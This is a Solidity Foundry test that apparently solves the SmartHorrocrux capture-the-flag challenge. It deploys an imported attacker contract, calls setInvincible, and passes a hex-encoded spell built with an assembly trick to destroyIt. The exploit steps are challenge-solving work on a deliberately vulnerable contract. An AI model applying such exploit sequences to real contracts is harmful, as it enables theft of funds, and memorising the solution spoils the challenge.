// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SmartHorrocrux.sol";
import "../src/attackers/SmartHorrocruxAttacker.sol";

contract SmartHorrocruxTest is Test {
    SmartHorrocrux public target;
    address public targetAddress;
    address public player;

    function setUp() public {
        target = new SmartHorrocrux{value: 2}();
        targetAddress = address(target);
        player = vm.addr(1);

        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testSmartHorrocrux() public {
        vm.startPrank(player, player);

        uint256 size;
        assembly {
            size := extcodesize(sload(targetAddress.slot))
        }

        (bool success, ) = address(target).call("");
        new SmartHorrocruxAttacker{value: 1}(targetAddress);
        target.setInvincible();

        bytes32 spellInBytes;
        string memory expectedSpell = vm.toString(
            bytes32(
                0x45746865724b6164616272610000000000000000000000000000000000000000
            )
        );
        assembly {
            spellInBytes := mload(sub(expectedSpell, 32))
        }
        console.log(vm.toString(spellInBytes));
        target.destroyIt(vm.toString(spellInBytes), 1);

        vm.stopPrank();
    }
}
